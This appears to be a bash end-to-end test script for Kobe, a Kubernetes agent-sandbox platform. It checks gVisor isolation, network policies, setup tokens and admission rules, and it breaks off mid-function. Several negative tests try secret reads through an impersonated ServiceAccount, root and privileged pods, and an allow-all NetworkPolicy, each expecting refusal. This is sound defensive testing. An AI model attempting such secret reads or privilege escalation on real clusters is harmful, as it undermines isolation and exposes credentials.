#!/usr/bin/env bash
# Kobe k3d end-to-end suite (KOBE-7). Expects a cluster from scripts/dev-cluster.sh and the Kobe
# images available to it under ghcr.io/splittingatom/kobe-*:${KOBE_IMAGE_TAG} (e.g. via
# `k3d image import`). Starts from clean state each run (dev Postgres, release, namespaces), installs
# the chart with dev/values.yaml, then checks platform invariants. Later tickets add their stories.
# Refuses to run against anything but a k3d context (or KOBE_E2E_CONTEXT, named explicitly).
set -euo pipefail
cd "$(dirname "$0")/.."

KUBECTL="${KUBECTL:-kubectl}"
HELM="${HELM:-helm}"
TAG="${KOBE_IMAGE_TAG:?set KOBE_IMAGE_TAG (use a per-run tag so stale images cannot pass)}"
NS=kobe-dev
SANDBOX_NS=kobe-e2e-sandbox
TEAM_NS=kobe-team-e2e # KOBE-22: created by the server, not by this script
TEAM2_NS=kobe-team-e2e2
UPSTREAM_NS=kobe-e2e-upstream # KOBE-38: an in-cluster HTTPS server standing in for the internet
MCP_NS=kobe-e2e-mcp # KOBE-58: a fake remote MCP server
LLM_NS=kobe-e2e-llm # KOBE-40: a fake model provider
# CI runs the suite as parallel shards, each on its own cluster (.github/workflows/e2e.yml).
# KOBE_E2E_TOOL_EXECUTOR=1 installs with sandbox.toolExecutor.enabled=true (KOBE-168): every section
# then runs with Pi's tools in the paired-uid executor, plus the isolation checks of e2e/executor/.
# Every shard installs from clean state and runs the checks section; then:
#   all (default)  every section, in order
#   suite          every section except the KOBE-25 cold-start trials
#   cold-start     the sections up to and including KOBE-25 hibernate and wake, with its trials
#   gate1-prep     only the KOBE-40 model setup e2e/gate1.sh needs; keeps the fake provider running
SHARD="${KOBE_E2E_SHARD:-all}"
case "$SHARD" in
  all | suite | cold-start | gate1-prep) ;;
  *) echo "unknown KOBE_E2E_SHARD '$SHARD' (all, suite, cold-start, gate1-prep)" >&2; exit 2 ;;
esac
failed=0

context=$($KUBECTL config current-context)
if [[ "$context" != k3d-* && "$context" != "${KOBE_E2E_CONTEXT:-}" ]]; then
  echo "refusing to run against context '$context' (expected k3d-*, or set KOBE_E2E_CONTEXT=$context)" >&2
  exit 2
fi

ok() { echo "ok   $1"; }
fail() { echo "FAIL $1"; failed=1; }
# (Written for bash 3.2: no quoted command substitutions nested in double quotes.)
expect() { # name, regex, actual output: passes when every line of actual matches regex
  local got
  got=$(printf '%s\n' "$3" | tail -3)
  if [[ -n "$3" ]] && ! printf '%s\n' "$3" | grep -Evq "$2"; then ok "$1"; else fail "$1: got [$got]"; fi
}
contains() { # name, regex, actual output: passes when some line matches regex
  local got
  got=$(printf '%s\n' "$3" | tail -3)
  if printf '%s\n' "$3" | grep -Eq "$2"; then ok "$1"; else fail "$1: got [$got]"; fi
}

wait_for() { # seconds regex command... → reruns command until a line matches regex (bounded); prints the last output
  local deadline=$((SECONDS + $1)) re="$2" out=""
  shift 2
  while :; do
    out=$("$@" 2>&1 || true)
    if printf '%s\n' "$out" | grep -Eq "$re"; then break; fi
    if ((SECONDS >= deadline)); then break; fi
    sleep 2
  done
  printf '%s\n' "$out"
}

PODS=()
cleanup() {
  for p in "${PODS[@]+"${PODS[@]}"}"; do $KUBECTL delete pod $p --ignore-not-found --wait=false >/dev/null 2>&1 || true; done
  $KUBECTL delete namespace "$SANDBOX_NS" --ignore-not-found --wait=false >/dev/null 2>&1 || true
  $KUBECTL delete namespace "$TEAM_NS" "$TEAM2_NS" "$UPSTREAM_NS" "$MCP_NS" --ignore-not-found --wait=false >/dev/null 2>&1 || true
  # gate1-prep leaves the fake model provider to e2e/gate1.sh, which runs next.
  if [[ "$SHARD" != gate1-prep ]]; then
    $KUBECTL delete namespace "$LLM_NS" --ignore-not-found --wait=false >/dev/null 2>&1 || true
  fi
  $KUBECTL delete runtimeclass kobe-e2e-runc --ignore-not-found >/dev/null 2>&1 || true
}
trap cleanup EXIT

# Reachability: positive checks wait for their target (bounded), then assert, so a dead target
# still fails. A Service answers only once it has ready endpoints, and a new pod joins the CNI's
# policy ipsets on kube-router's next sync, so policy-guarded targets refuse it for its first
# seconds (docs/ledger/KOBE-22.md). Negative checks (BLOCKED) run only after a positive control
# succeeded from the same pod; otherwise they report UNTESTED and fail, never pass vacuously.
REACH_TIMEOUT=60
wait_endpoints() { # namespace service... → waits up to REACH_TIMEOUT s for ready endpoints
  local ns="$1" svc deadline=$((SECONDS + REACH_TIMEOUT))
  shift
  for svc in "$@"; do
    until [[ -n "$($KUBECTL -n "$ns" get endpointslices -l "kubernetes.io/service-name=$svc" \
      -o jsonpath='{.items[*].endpoints[?(@.conditions.ready==true)].addresses[0]}' 2>/dev/null)" ]]; do
      if ((SECONDS >= deadline)); then echo "warning: $ns/$svc has no ready endpoints" >&2; break; fi
      sleep 1
    done
  done
}
# Shell snippet for a probe pod: runs a command until it succeeds or [seconds] (default REACH_TIMEOUT) pass; its exit
# status says which: one { } group, so `! $(retry ...)`, `$(retry ...) && ...` and `if` gate on
# it. (No double quotes: team_pod embeds the pod command in JSON.)
retry() { # command [seconds]
  echo "{ ok=0; end=\$((\$(date +%s) + ${2:-$REACH_TIMEOUT})); while :; do if $1 >/dev/null 2>&1; then ok=1; break; fi; \
[ \$(date +%s) -ge \$end ] && break; sleep 1; done; [ \$ok = 1 ]; }"
}
answers() { echo "wget -qO- -T 3 $1"; } # [wget options] URL → a command that succeeds once it answers
# Gated negative check, in a probe pod: when the control URL answers, prints control=REACHED and
# label=REACHED|BLOCKED for URL; otherwise control=BLOCKED and label=UNTESTED.
gated() { # control-url label url
  echo "if $(retry "$(answers "$1")"); then echo control=REACHED; \
$(answers "$3") >/dev/null 2>&1 && echo $2=REACHED || echo $2=BLOCKED; else echo control=BLOCKED; echo $2=UNTESTED; fi"
}
probe() { # namespace, shell command → prints its output (unique pod, cleaned up on exit)
  local ns="$1" name="probe-$RANDOM$RANDOM"
  PODS+=("-n $ns $name")
  $KUBECTL -n "$ns" run "$name" --restart=Never --image=busybox:1.37 --command -- sh -c "$2" >/dev/null
  local phase="" i
  for i in $(seq 1 120); do # until the pod finishes either way (a failed wget is a valid answer)
    phase=$($KUBECTL -n "$ns" get pod "$name" -o jsonpath='{.status.phase}' 2>/dev/null || true)
    [[ "$phase" == Succeeded || "$phase" == Failed ]] && break
    sleep 2
  done
  $KUBECTL -n "$ns" logs "$name" 2>/dev/null || true
}
reachable() { # namespace service-namespace service [wget options] URL → URL's body once it answers
  wait_endpoints "$2" "$3"
  probe "$1" "$(retry "$(answers "$4")"); $(answers "$4")"
}

echo "==> prerequisites"
$KUBECTL get runtimeclass gvisor >/dev/null 2>&1 || { echo "RuntimeClass gvisor missing: run scripts/dev-cluster.sh" >&2; exit 2; }
$KUBECTL get crd sandboxes.agents.x-k8s.io >/dev/null 2>&1 \
  || { echo "agent-sandbox CRDs missing: run scripts/install-agent-sandbox.sh" >&2; exit 2; }

# k3s installs its bundled Traefik and CoreDNS asynchronously through helm-install Jobs that can retry for minutes
# (KOBE-134: Service traefik did not exist for ~4 min, so probes got "bad address"). Wait on the conditions, not time.
INFRA_TIMEOUT=${INFRA_TIMEOUT:-420s}
for d in coredns traefik; do
  $KUBECTL -n kube-system wait --for=create "deployment/$d" --timeout="$INFRA_TIMEOUT" >/dev/null \
    && $KUBECTL -n kube-system rollout status "deployment/$d" --timeout="$INFRA_TIMEOUT" >/dev/null \
    || { echo "kube-system/$d not available within $INFRA_TIMEOUT" >&2; exit 2; }
done
$KUBECTL -n kube-system wait --for=create service/traefik --timeout="$INFRA_TIMEOUT" >/dev/null \
  || { echo "kube-system/traefik Service missing" >&2; exit 2; }

echo "==> clean state"
$HELM uninstall kobe -n "$NS" --wait >/dev/null 2>&1 || true
$KUBECTL delete namespace "$NS" kobe-deps "$SANDBOX_NS" "$TEAM_NS" "$TEAM2_NS" "$UPSTREAM_NS" "$MCP_NS" "$LLM_NS" --ignore-not-found --wait=false >/dev/null
for ns in "$NS" kobe-deps "$SANDBOX_NS" "$TEAM_NS" "$TEAM2_NS" "$UPSTREAM_NS" "$MCP_NS" "$LLM_NS"; do
  $KUBECTL wait --for=delete "namespace/$ns" --timeout=180s >/dev/null 2>&1 || true
done

echo "==> deploying dependencies and Kobe ${TAG}"
$KUBECTL apply -f dev/postgres.yaml >/dev/null
$KUBECTL -n kobe-deps rollout status deploy/pg --timeout=180s >/dev/null
$KUBECTL apply -f dev/mailpit.yaml >/dev/null
$KUBECTL -n kobe-deps rollout status deploy/mailpit --timeout=180s >/dev/null
$KUBECTL apply -f dev/s3.yaml >/dev/null # KOBE-27: S3-compatible test fixture (SeaweedFS, Apache-2.0)
$KUBECTL -n kobe-deps rollout status deploy/s3 --timeout=300s >/dev/null
$HELM upgrade --install kobe charts/kobe -n "$NS" -f dev/values.yaml \
  --set global.imageTag="$TAG" --set global.imagePullPolicy=IfNotPresent \
  ${KOBE_E2E_TOOL_EXECUTOR:+--set sandbox.toolExecutor.enabled=true} --wait --timeout 10m

echo "==> checks"
psql_kobe() { $KUBECTL -n kobe-deps exec deploy/pg -- psql -U postgres -d kobe -tAc "$1" 2>&1; }

for d in web server scheduler mcp-proxy egress-proxy model-gateway bifrost; do
  if $KUBECTL -n "$NS" rollout status "deploy/kobe-$d" --timeout=60s >/dev/null 2>&1; then ok "deployment kobe-$d is available"
  else fail "deployment kobe-$d is available"; fi
done
gated_pods='app.kubernetes.io/component in (server,scheduler)'
gate_fmt='{range .items[*]}{range .status.initContainerStatuses[*]}{.name}={.state.terminated.reason}{"\n"}{end}{end}'
gates=$($KUBECTL -n "$NS" get pods -l "$gated_pods" --field-selector=status.phase=Running -o jsonpath="$gate_fmt")
expect "every server/scheduler init gate (isolation, migrations) completed" '^(isolation-preflight|wait-for-migrations)=Completed$' "$gates"
gate_count=$(printf '%s\n' "$gates" | grep -c .)
# 2 server pods x wait-for-migrations + 1 scheduler pod x (isolation-preflight, wait-for-migrations);
# the server checks isolation in process instead (KOBE-9).
contains "init gates ran on all 3 server/scheduler pods" "^4$" "$gate_count"
expect "app-role grants recorded for the newest migration" '^t$' "$(psql_kobe \
  'select (select migration_when from drizzle.kobe_grants_applied) = (select max(created_at) from drizzle.__drizzle_migrations)')"
expect "team tables have FORCE ROW LEVEL SECURITY" '^team_members\|true$' "$(psql_kobe \
  "select c.relname || '|' || c.relforcerowsecurity from pg_class c join pg_namespace n on n.oid = c.relnamespace where n.nspname = 'public' and c.relname = 'team_members'")"
wait_endpoints "$NS" kobe-web
contains "web answers through the Traefik ingress" '"service":"web"' \
  "$(reachable "$NS" kube-system traefik "--header 'Host: kobe.localtest.me' http://traefik.kube-system/api/healthz")"
contains "the web app serves the chat (KOBE-32)" 'data-kobe-chat' \
  "$(reachable "$NS" kube-system traefik "--header 'Host: kobe.localtest.me' http://traefik.kube-system/")"
contains "server answers" '"service":"server"' "$(reachable "$NS" "$NS" kobe-server http://kobe-server/healthz)"
# KOBE-9: every server/scheduler process verified isolation itself (not disclosed by /readyz).
# KOBE-125: judge only the CURRENT pods: those owned by the deployment's newest ReplicaSet and not
# terminating (a rollout leaves old-ReplicaSet and terminating pods that never need to verify).
# The server retries its startup check before turning ready, but the log line is still read
# asynchronously: wait (bounded, 90 s per component) for it. The check itself is unchanged: the pod's own
# log must say its in-process RuntimeClass handler check passed.
isolation_verified() { # pod → succeeds once its log records the verification
  # Read the whole log first: `kubectl logs | grep -q` makes grep exit at the first match, kubectl
  # then dies of SIGPIPE and, under pipefail, a verified pod reads as unverified (KOBE-125).
  local log
  log=$($KUBECTL -n "$NS" logs "$1" 2>/dev/null) || return 1
  grep -q '"msg":"isolation verified: agents enabled"' <<<"$log"
}
current_pods() { # component → names of the live pods of the deployment's current ReplicaSet
  local rs
  rs=$($KUBECTL -n "$NS" get rs -l "app.kubernetes.io/component=$1" \
    -o jsonpath='{range .items[*]}{.metadata.annotations.deployment\.kubernetes\.io/revision}{" "}{.metadata.name}{"\n"}{end}' |
    sort -n | tail -n 1 | cut -d' ' -f2)
  [ -n "$rs" ] || return 0
  $KUBECTL -n "$NS" get pods -l "app.kubernetes.io/component=$1" \
    -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.ownerReferences[0].name}{" "}{.metadata.deletionTimestamp}{"\n"}{end}' |
    awk -v rs="$rs" 'NF == 2 && $2 == rs { print $1 }'
}
iso=""
for component in server scheduler; do
  current=""
  deadline=$((SECONDS + 90))
  until current=$(current_pods "$component") && [ -n "$current" ] || ((SECONDS >= deadline)); do sleep 2; done
  [ -n "$current" ] || iso+="$component:no-current-pods "
  for pod in $current; do
    until isolation_verified "$pod" || ((SECONDS >= deadline)); do sleep 2; done
    if isolation_verified "$pod"; then iso+="verified "; else
      iso+="$pod:unverified "
      echo "     $pod isolation log tail: $($KUBECTL -n "$NS" logs "$pod" 2>&1 | grep -i isolation | tail -n 3)"
    fi
  done
done
contains "server and scheduler verified the gVisor RuntimeClass in process" '^verified verified verified $' "$iso"
# KOBE-40: Bifrost admits only the server (config sync) and the model-gateway shim.
# The sync's own record says whether it reached Bifrost (a pass lists and writes through its admin API).
gateway_state() { psql_kobe "SELECT 'in_sync=' || (synced_version >= desired_version) || ' error=' || coalesce(last_error, '-') FROM model_gateway_state"; }
wait_endpoints "$NS" kobe-bifrost
bifrost=$(wait_for 90 '^in_sync=true error=-$' gateway_state)
contains "the server's gateway sync reached Bifrost (in sync, no error)" '^in_sync=true error=-$' "$bifrost"
contains "Bifrost has not restarted" '^0$' "$($KUBECTL -n "$NS" get pods -l app.kubernetes.io/component=bifrost \
  -o jsonpath='{.items[*].status.containerStatuses[*].restartCount}' 2>/dev/null)"
# Once the control answers, the probe pod is in the policy ipsets: BLOCKED below is the policy.
np=$(probe default "$(gated http://kobe-web.$NS/api/healthz bifrost http://kobe-bifrost.$NS:8080/health)")
contains "probe from another namespace can reach unrestricted services (control)" '^control=REACHED$' "$np"
contains "Bifrost is not reachable from other namespaces" '^bifrost=BLOCKED$' "$np"
np=$(probe "$NS" "$(gated http://kobe-web/api/healthz bifrost http://kobe-bifrost:8080/health)")
contains "control: a release-namespace probe reaches the web app" '^control=REACHED$' "$np"
contains "Bifrost refuses other pods of the release namespace (only server and shim)" '^bifrost=BLOCKED$' "$np"
# First-run setup through the ingress (KOBE-12): needs the install's setup token.
setup_token=$($KUBECTL -n "$NS" get secret kobe-auth -o jsonpath='{.data.setup-token}' | base64 -d)
ingress() { # method path [json]: full response (status line + body) via the Traefik ingress
  local data=""
  if [[ -n "${3:-}" ]]; then data="--post-data '$3'"; fi
  wait_endpoints kube-system traefik
  probe "$NS" "$(retry 'nc -w 3 traefik.kube-system 80 </dev/null'); \
    wget -qO- -S --header 'Host: kobe.localtest.me' --header 'Origin: http://kobe.localtest.me' \
    --header 'Content-Type: application/json' $data http://traefik.kube-system$2 2>&1"
}
contains "first-run setup is required on a fresh install" '"required":true' "$(ingress GET /v1/setup)"
contains "setup without the setup token is refused" 'HTTP/1.1 403|invalid_setup_token' \
  "$(ingress POST /v1/setup '{"email":"owner@e2e.test","name":"Owner","password":"e2e owner password"}')"
# Built outside "$(...)": bash 3.2 keeps backslashes from \" inside quoted command substitutions.
owner_with_token=$(printf '{"email":"owner@e2e.test","name":"Owner","password":"e2e owner password","setupToken":"%s"}' "$setup_token")
contains "setup with the setup token creates the Owner" 'HTTP/1.1 201' \
  "$(ingress POST /v1/setup "$owner_with_token")"
contains "setup is disabled once the Owner exists" '"required":false' "$(ingress GET /v1/setup)"
# KOBE-13: password reset mails a link through the configured SMTP relay (Mailpit in e2e); unknown
# addresses get the same answer and no email.
contains "password reset answers 200" 'HTTP/1.1 200' \
  "$(ingress POST /api/auth/request-password-reset '{"email":"owner@e2e.test"}')"
contains "password reset for an unknown address answers the same" 'HTTP/1.1 200' \
  "$(ingress POST /api/auth/request-password-reset '{"email":"nobody@e2e.test"}')"
mailbox=http://mailpit.kobe-deps:8025/api/v1/messages
wait_endpoints kobe-deps mailpit
mail=$(probe "$NS" "$(retry "$(answers $mailbox) | grep -q 'Reset your Kobe password'"); $(answers $mailbox)")
contains "the server delivered the reset email over SMTP" 'Reset your Kobe password' "$mail"
contains "the reset email went to the account's address" 'owner@e2e.test' "$mail"
if printf '%s' "$mail" | grep -q 'nobody@e2e.test'; then fail "no email for an unknown address"; else ok "no email for an unknown address"; fi
contains "chart refuses a RuntimeClass that does not isolate" 'refuses to run agents' \
  "$($HELM upgrade kobe charts/kobe -n "$NS" --reuse-values --set isolation.runtimeClassName=does-not-exist 2>&1 || true)"

start_sandbox() {
  $KUBECTL create namespace "$SANDBOX_NS" --dry-run=client -o yaml | $KUBECTL apply -f - >/dev/null &&
  $KUBECTL apply -f - <<EOF
apiVersion: agents.x-k8s.io/v1beta1
kind: Sandbox
metadata: { name: e2e, namespace: $SANDBOX_NS }
spec:
  podTemplate:
    spec:
      runtimeClassName: gvisor
      securityContext: { runAsNonRoot: true, runAsUser: 1000, seccompProfile: { type: RuntimeDefault } }
      containers:
        - name: sandbox
          image: $KOBE_SANDBOX_IMAGE
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c", "dmesg | head -1; id -u; pi --version; sleep 600"]
          securityContext: { allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: { drop: ["ALL"] } }
          volumeMounts: [{ name: tmp, mountPath: /tmp }, { name: home, mountPath: /home/kobe }]
      volumes: [{ name: tmp, emptyDir: {} }, { name: home, emptyDir: {} }]
EOF
}

if [[ -n "${KOBE_SANDBOX_IMAGE:-}" ]]; then
  # A real agent-sandbox Sandbox (controller + CRD), not a hand-built pod.
  if ! setup=$(start_sandbox 2>&1); then fail "create agent-sandbox Sandbox: $setup"; fi
  $KUBECTL -n "$SANDBOX_NS" wait --for=condition=Ready sandbox/e2e --timeout=240s >/dev/null 2>&1 || true
  sandbox_logs() { $KUBECTL -n "$SANDBOX_NS" logs e2e 2>&1; }
  # `pi --version` boots Pi (seconds under gVisor): wait for its line, not a fixed delay.
  out=$(wait_for 90 '^1\.0\.' sandbox_logs)
  contains "agent-sandbox Sandbox becomes Ready" '^True$' \
    "$($KUBECTL -n "$SANDBOX_NS" get sandbox e2e -o jsonpath='{.status.conditions[?(@.type=="Ready")].status}')"
  contains "sandbox boots under gVisor" 'Starting gVisor' "$out"
  contains "sandbox runs as uid 1000" '^1000$' "$out"
  contains "sandbox has Pi 1.0.x" '^1\.0\.' "$out"
elif [[ "${CI:-}" == "true" ]]; then
  fail "KOBE_SANDBOX_IMAGE is not set (required in CI)"
else
  echo "SKIP sandbox checks (KOBE_SANDBOX_IMAGE not set)"
fi


E2E_TEAM_ID=6f1d1a2b-0c3d-4e5f-8a9b-0c1d2e3f4a5b
E2E_USER_ID=7a2e2b3c-1d4e-4f6a-9b0c-1d2e3f4a5b6c

# gate1-prep skips from here to the KOBE-40 model setup (the end of this `if` is marked).
if [[ "$SHARD" != gate1-prep ]]; then

# KOBE-22: the server's sandbox provider creates a team namespace (default-deny NetworkPolicy,
# quota, warm pool) and a (user, team) sandbox under gVisor; admission policies pin isolation.
echo "==> sandbox provider (KOBE-22)"
ensure_sandbox() { # [team-id slug user-id]: defaults to the e2e team and sandbox user
  $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node dist/cli/sandbox.js ensure \
    --team-id "${1:-$E2E_TEAM_ID}" --team-slug "${2:-e2e}" --user-id "${3:-$E2E_USER_ID}" 2>&1
}
json_field() { # field, single-line JSON object with string values → value (no node/jq on runners)
  printf '%s' "$2" | sed -n "s/.*\"$1\":\"\([^\"]*\)\".*/\1/p" | head -1
}
ensure_out=$(ensure_sandbox || true)
handle=$(printf '%s\n' "$ensure_out" | tail -1)
sandbox_id=$(json_field sandboxId "$handle")
sandbox_pod=$(json_field podName "$handle")
contains "server creates a (user, team) sandbox through the isolation gate" '^[0-9a-f-]{36}$' "${sandbox_id:-$ensure_out}"
contains "ensuring it again returns the same sandbox" "^${sandbox_id:-none}$" \
  "$(json_field sandboxId "$( (ensure_sandbox || true) | tail -1)")"
contains "team namespace carries its team id" "^${E2E_TEAM_ID}$" \
  "$($KUBECTL get namespace "$TEAM_NS" -o jsonpath='{.metadata.labels.kobe\.splittingatom\.io/team-id}')"
contains "team namespace enforces Pod Security 'baseline' (KOBE-71; the rest of 'restricted' by admission)" '^baseline$' \
  "$($KUBECTL get namespace "$TEAM_NS" -o jsonpath='{.metadata.labels.pod-security\.kubernetes\.io/enforce}')"
# KOBE-126: the server's team-namespace reconcile (KOBE-115) must converge the namespace just created
# with failed=0 (no 403 from missing RBAC). dev/values.yaml runs it every 30 s; read the newest summary
# line of any server pod (whichever replica holds the lock logs it), waiting for one that saw the team.
reconcile_summary() {
  local pod
  for pod in $($KUBECTL -n "$NS" get pods -l app.kubernetes.io/component=server -o name); do
    $KUBECTL -n "$NS" logs "$pod" -c server 2>/dev/null || true
  done | grep '"msg":"team namespaces reconciled"' | grep -v '"converged":0,' | tail -n 1 || true
}
reconcile_line=$(wait_for 120 '"converged":[1-9]' reconcile_summary)
contains "team-namespace reconcile converges the team namespace (KOBE-126)" '"converged":[1-9]' "$reconcile_line"
contains "team-namespace reconcile reports failed=0 (KOBE-126)" '"failed":0,' "$reconcile_line"
np_spec() { $KUBECTL -n "$TEAM_NS" get networkpolicy kobe-sandbox-isolation -o jsonpath="$1"; }
contains "team NetworkPolicy selects every pod but Orbit eval pods (KOBE-93)" \
  '^\{"matchExpressions":\[\{"key":"kobe\.splittingatom\.io/orbit-eval","operator":"DoesNotExist"\}\]\}$' "$(np_spec '{.spec.podSelector}')"
contains "eval NetworkPolicy selects only Orbit eval pods and allows no ingress (KOBE-93)" \
  '^\{"matchExpressions":\[\{"key":"kobe\.splittingatom\.io/orbit-eval","operator":"Exists"\}\]\} (\[\])?$' \
  "$($KUBECTL -n "$TEAM_NS" get networkpolicy kobe-orbit-eval-isolation -o jsonpath='{.spec.podSelector} {.spec.ingress}')"
contains "eval NetworkPolicy allows egress to the model gateway only" '^model-gateway$' \
  "$($KUBECTL -n "$TEAM_NS" get networkpolicy kobe-orbit-eval-isolation -o jsonpath='{.spec.egress[*].to[*].podSelector.matchLabels.app\.kubernetes\.io/component}')"
contains "team NetworkPolicy governs ingress and egress" '^\["Ingress","Egress"\]$' "$(np_spec '{.spec.policyTypes}')"
contains "team NetworkPolicy allows no ingress at all" '^(\[\])?$' "$(np_spec '{.spec.ingress}')"
contains "team namespace has only Kobe's two NetworkPolicies (controller policy unmanaged)" '^kobe-orbit-eval-isolation kobe-sandbox-isolation $' \
  "$($KUBECTL -n "$TEAM_NS" get networkpolicy -o name | sed 's|.*/||' | sort | tr '\n' ' ')"
contains "team ResourceQuota is in place" '^20$' \
  "$($KUBECTL -n "$TEAM_NS" get resourcequota kobe-team-quota -o jsonpath='{.spec.hard.requests\.cpu}')"
contains "team warm pool exists" '^1$' \
  "$($KUBECTL -n "$TEAM_NS" get sandboxwarmpool kobe-sandbox -o jsonpath='{.spec.replicas}')"
contains "sandbox pod is set to the gVisor RuntimeClass" '^gvisor$' \
  "$($KUBECTL -n "$TEAM_NS" get pod "${sandbox_pod:-none}" -o jsonpath='{.spec.runtimeClassName}' 2>&1)"
expect "every pod in the team namespace (sandbox + warm pool) uses gVisor" '^gvisor$' \
  "$($KUBECTL -n "$TEAM_NS" get pods -o jsonpath='{range .items[*]}{.spec.runtimeClassName}{"\n"}{end}')"
node=$($KUBECTL -n "$TEAM_NS" get pod "${sandbox_pod:-none}" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)
if [[ -n "$node" ]] && docker inspect "$node" >/dev/null 2>&1; then
  handler=""
  for _ in $(seq 1 30); do
    handler=$(docker exec "$node" crictl pods --name "$sandbox_pod" --namespace "$TEAM_NS" -o json 2>/dev/null \
      | sed -n 's/.*"runtimeHandler": *"\([^"]*\)".*/\1/p' | head -1 || true)
    [[ -n "$handler" ]] && break
    sleep 2
  done
  contains "the node runs the sandbox pod with the runsc (gVisor) handler" '^runsc$' "$handler"
else
  echo "SKIP node runtime handler check (k3d node container not reachable from here)"
fi

admission() { # pod spec overrides (JSON) → kubectl's answer for a pod in the team namespace
  $KUBECTL -n "$TEAM_NS" run "adm-$RANDOM" --restart=Never --image=busybox:1.37 --dry-run=server \
    --overrides="$1" -o name 2>&1 || true
}
SEC_POD='"securityContext":{"runAsNonRoot":true,"runAsUser":1000,"seccompProfile":{"type":"RuntimeDefault"}}'
SEC_CTR='"securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}'
contains "admission refuses a team pod without the gVisor RuntimeClass" 'must use RuntimeClass' \
  "$(admission "{\"spec\":{\"automountServiceAccountToken\":false,$SEC_POD,\"containers\":[{\"name\":\"c\",\"image\":\"busybox:1.37\",$SEC_CTR}]}}")"
# A RuntimeClass that exists but does not isolate (cluster-scoped; removed on exit).
printf 'apiVersion: node.k8s.io/v1\nkind: RuntimeClass\nmetadata: {name: kobe-e2e-runc}\nhandler: runc\n' \
  | $KUBECTL apply -f - >/dev/null 2>&1 || true
contains "admission refuses a team pod under a non-isolating RuntimeClass" 'must use RuntimeClass' \
  "$(admission "{\"spec\":{\"runtimeClassName\":\"kobe-e2e-runc\",\"automountServiceAccountToken\":false,$SEC_POD,\"containers\":[{\"name\":\"c\",\"image\":\"busybox:1.37\",$SEC_CTR}]}}")"
contains "admission refuses a team pod mounting a Secret" 'must not mount Secrets' \
  "$(admission "{\"spec\":{\"runtimeClassName\":\"gvisor\",\"automountServiceAccountToken\":false,$SEC_POD,\"containers\":[{\"name\":\"c\",\"image\":\"busybox:1.37\",$SEC_CTR}],\"volumes\":[{\"name\":\"s\",\"secret\":{\"secretName\":\"x\"}}]}}")"
contains "admission refuses a team pod with a Kubernetes API token" 'must not mount a Kubernetes API token' \
  "$(admission "{\"spec\":{\"runtimeClassName\":\"gvisor\",$SEC_POD,\"containers\":[{\"name\":\"c\",\"image\":\"busybox:1.37\",$SEC_CTR}]}}")"
# KOBE-71: the namespace is Pod Security "baseline" so sandboxes can add SETUID/SETGID for their
# Pi identities; Kobe's own policy keeps the rest of "restricted".
contains "admission refuses a team container adding any other capability (KOBE-71)" "only the sandbox container 'agent'" \
  "$(admission "{\"spec\":{\"runtimeClassName\":\"gvisor\",\"automountServiceAccountToken\":false,$SEC_POD,\"containers\":[{\"name\":\"c\",\"image\":\"busybox:1.37\",\"securityContext\":{\"capabilities\":{\"drop\":[\"ALL\"],\"add\":[\"SETUID\",\"CHOWN\"]}}}]}}")"
contains "admission refuses a team pod running as root (KOBE-71)" 'must run as non-root' \
  "$(admission "{\"spec\":{\"runtimeClassName\":\"gvisor\",\"automountServiceAccountToken\":false,\"securityContext\":{\"runAsUser\":0,\"seccompProfile\":{\"type\":\"RuntimeDefault\"}},\"containers\":[{\"name\":\"c\",\"image\":\"busybox:1.37\",$SEC_CTR}]}}")"
contains "admission refuses SETUID on any container but the sandbox's own (KOBE-71)" "only the sandbox container 'agent'" \
  "$(admission "{\"spec\":{\"runtimeClassName\":\"gvisor\",\"automountServiceAccountToken\":false,$SEC_POD,\"containers\":[{\"name\":\"c\",\"image\":\"busybox:1.37\",\"securityContext\":{\"allowPrivilegeEscalation\":false,\"capabilities\":{\"drop\":[\"ALL\"],\"add\":[\"SETUID\"]}}}]}}")"
contains "admission refuses privilege escalation on any container but the sandbox's own (KOBE-71)" "only the sandbox container 'agent'" \
  "$(admission "{\"spec\":{\"runtimeClassName\":\"gvisor\",\"automountServiceAccountToken\":false,$SEC_POD,\"containers\":[{\"name\":\"c\",\"image\":\"busybox:1.37\",\"securityContext\":{\"allowPrivilegeEscalation\":true,\"capabilities\":{\"drop\":[\"ALL\"]}}}]}}")"
server_sa="system:serviceaccount:$NS:kobe-server"
contains "the server's ServiceAccount cannot create namespaces outside kobe-team-*" 'only manage kobe-team-\* namespaces' \
  "$($KUBECTL create namespace kobe-e2e-evil --as="$server_sa" --dry-run=server 2>&1 || true)"
contains "the server's ServiceAccount cannot read Secrets in team namespaces" 'forbidden' \
  "$($KUBECTL -n "$TEAM_NS" get secrets --as="$server_sa" 2>&1 || true)"
contains "the server's ServiceAccount cannot create pods in team namespaces" 'forbidden' \
  "$($KUBECTL -n "$TEAM_NS" run x --image=busybox:1.37 --as="$server_sa" --dry-run=server 2>&1 || true)"
contains "nobody else may add NetworkPolicies to a team namespace" 'only the Kobe server manages NetworkPolicies' \
  "$(printf 'apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata: {name: allow-all, namespace: %s}\nspec: {podSelector: {}, egress: [{}], policyTypes: [Egress]}\n' "$TEAM_NS" \
    | $KUBECTL apply --dry-run=server -f - 2>&1 || true)"

TEAM_PROBES=()
team_pod() { # namespace, name, shell command → a sandbox-like pod (gVisor, bootstrap token)
  TEAM_PROBES+=("$2")
  PODS+=("-n $1 $2")
  $KUBECTL -n "$1" run "$2" --restart=Never --image=busybox:1.37 --overrides="{\"spec\":{
    \"runtimeClassName\":\"gvisor\",\"automountServiceAccountToken\":false,\"serviceAccountName\":\"kobe-sandbox\",$SEC_POD,
    \"containers\":[{\"name\":\"$2\",\"image\":\"busybox:1.37\",\"command\":[\"sh\",\"-c\",\"$3\"],$SEC_CTR,
      \"resources\":{\"requests\":{\"cpu\":\"50m\",\"memory\":\"32Mi\"},\"limits\":{\"cpu\":\"200m\",\"memory\":\"64Mi\"}},
      \"volumeMounts\":[{\"name\":\"kobe-bootstrap\",\"mountPath\":\"/var/run/secrets/kobe\"}]}],
    \"volumes\":[{\"name\":\"kobe-bootstrap\",\"projected\":{\"sources\":[{\"serviceAccountToken\":{
      \"audience\":\"kobe.sandbox-bootstrap\",\"expirationSeconds\":3600,\"path\":\"bootstrap-token\"}}]}}]}}" >/dev/null
}
team_probe() { # shell command → its output, run from a sandbox-like pod in the team namespace
